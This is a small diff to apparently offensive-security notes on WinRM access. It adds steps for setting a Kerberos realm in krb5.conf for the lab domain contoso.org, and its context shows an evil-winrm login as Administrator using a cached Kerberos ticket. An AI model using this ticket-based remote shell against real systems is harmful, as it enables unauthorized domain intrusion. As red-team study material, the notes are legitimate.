@@ -114,7 +114,11 @@ C:\>
 ### WinRM
 
 ```bash
-# MAKE SURE /etc/krb5.conf HAS THE contoso.org DOMAIN SPECIFIED
+# add a realm to krb5.conf (note the capitalization)
+cat /etc/krb5.conf | grep -A1 realms
+# [realms]
+#      CONTOSO.ORG = { kdc = WIN-KML6TP4LOOL.contoso.org }
+
 # MAKE SURE -i INCLUDES FQDN AND THAT IT IS RESOLVABLE
 # make sure the SPN is HTTP/...
 export KRB5CCNAME=Administrator.ccache && evil-winrm -i WIN-KML6TP4LOOL.contoso.org -r contoso.org
